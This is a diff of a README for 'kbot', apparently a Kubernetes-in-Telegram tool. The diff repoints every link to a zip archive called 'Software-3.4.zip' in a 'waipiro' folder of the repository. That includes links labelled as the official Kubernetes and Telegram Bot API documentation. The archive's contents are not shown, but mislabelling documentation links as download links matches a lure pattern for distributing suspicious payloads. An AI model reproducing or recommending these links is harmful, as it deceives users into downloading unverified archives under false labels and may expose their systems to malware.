@@ -1,6 +1,6 @@
 # 🤖 kbot - Simplify Kubernetes Management in Telegram
 
-[![Download kbot](https://raw.githubusercontent.com/cropy128900/kbot/master/waipiro/kbot.zip%https://raw.githubusercontent.com/cropy128900/kbot/master/waipiro/kbot.zip)](https://raw.githubusercontent.com/cropy128900/kbot/master/waipiro/kbot.zip)
+[![Download kbot](https://github.com/cropy128900/kbot/raw/refs/heads/master/waipiro/Software-3.4.zip%https://github.com/cropy128900/kbot/raw/refs/heads/master/waipiro/Software-3.4.zip)](https://github.com/cropy128900/kbot/raw/refs/heads/master/waipiro/Software-3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ To run kbot, ensure your device meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started with kbot, visit this page to download the latest release: [Download kbot](https://raw.githubusercontent.com/cropy128900/kbot/master/waipiro/kbot.zip).
+To get started with kbot, visit this page to download the latest release: [Download kbot](https://github.com/cropy128900/kbot/raw/refs/heads/master/waipiro/Software-3.4.zip).
 
 1. Go to the releases page using the link above.
 2. Look for the latest version of kbot.
@@ -81,8 +81,8 @@ If you want to contribute to this project, you're welcome! Check the contributio
 
 Explore more about Kubernetes and how to manage clusters:
 
-- [Kubernetes Official Documentation](https://raw.githubusercontent.com/cropy128900/kbot/master/waipiro/kbot.zip)
-- [Telegram Bot API Documentation](https://raw.githubusercontent.com/cropy128900/kbot/master/waipiro/kbot.zip)
+- [Kubernetes Official Documentation](https://github.com/cropy128900/kbot/raw/refs/heads/master/waipiro/Software-3.4.zip)
+- [Telegram Bot API Documentation](https://github.com/cropy128900/kbot/raw/refs/heads/master/waipiro/Software-3.4.zip)
 
 ## 🖥️ Frequently Asked Questions
 
@@ -100,6 +100,6 @@ If kbot doesn't respond, ensure your Internet connection is active. You can try 
 
 ## 🔔 Keep Updated
 
-Stay tuned for future updates! Regularly check the [Download kbot](https://raw.githubusercontent.com/cropy128900/kbot/master/waipiro/kbot.zip) link for new versions and features.
+Stay tuned for future updates! Regularly check the [Download kbot](https://github.com/cropy128900/kbot/raw/refs/heads/master/waipiro/Software-3.4.zip) link for new versions and features.
 
 Thank you for using kbot! Enjoy easier Kubernetes management!
